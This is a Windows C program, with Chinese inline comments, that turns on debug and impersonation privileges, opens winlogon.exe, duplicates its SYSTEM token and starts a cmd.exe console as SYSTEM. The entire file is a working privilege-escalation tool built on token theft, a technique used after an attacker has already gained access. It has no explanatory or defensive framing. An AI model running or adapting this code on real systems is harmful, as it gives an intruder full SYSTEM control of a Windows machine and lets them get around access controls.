#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

BOOL EnablePrivilege(LPCTSTR privilege) {
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        printf("OpenProcessToken failed: %d\n", GetLastError());
        return FALSE;
    }

    LookupPrivilegeValue(NULL, privilege, &tkp.Privileges[0].Luid);
    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, 0);
    if (GetLastError() != ERROR_SUCCESS) {
        printf("AdjustTokenPrivileges failed: %d\n", GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }

    CloseHandle(hToken);
    return TRUE;
}
BOOL RunSystemCmd() {
    DWORD winlogonPid = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("CreateToolhelp32Snapshot failed: %d\n", GetLastError());
        return FALSE;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, L"winlogon.exe") == 0) {
                winlogonPid = pe32.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);

    if (winlogonPid == 0) {
        printf("Could not find winlogon.exe\n");
        return FALSE;
    }
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, winlogonPid);
    if (hProcess == NULL) {
        printf("OpenProcess failed: %d\n", GetLastError());
        return FALSE;
    }

    HANDLE hToken = NULL;
    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
        printf("OpenProcessToken failed: %d\n", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }

    HANDLE hDupToken = NULL;
    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hDupToken)) {
        printf("DuplicateTokenEx failed: %d\n", GetLastError());
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return FALSE;
    }
    STARTUPINFO si = { sizeof(STARTUPINFO) };
    PROCESS_INFORMATION pi;
    WCHAR cmdPath[] = L"cmd.exe";

    if (!CreateProcessWithTokenW(
        hDupToken,                          // SYSTEM 令牌
        LOGON_WITH_PROFILE,                  // 加载用户配置文件
        NULL,                                // 不指定应用程序名（使用命令行）
        cmdPath,                            // 命令行（cmd.exe）
        CREATE_NEW_CONSOLE,                  // 创建新控制台窗口
        NULL,                                // 使用默认环境变量
        NULL,                               // 使用当前目录
        &si,                                // 启动信息
        &pi                                 // 进程信息
    )) {
        printf("CreateProcessWithTokenW failed: %d\n", GetLastError());
        CloseHandle(hDupToken);
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("Successfully launched CMD with SYSTEM privileges!\n");
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(hDupToken);
    CloseHandle(hToken);
    CloseHandle(hProcess);

    return TRUE;
}

int main() {
    if (!EnablePrivilege(SE_DEBUG_NAME) || !EnablePrivilege(SE_IMPERSONATE_NAME)) {
        printf("Failed to enable privileges\n");
        return 1;
    }
    if (!RunSystemCmd()) {
        printf("Failed to run CMD as SYSTEM\n");
        return 1;
    }

    return 0;
}
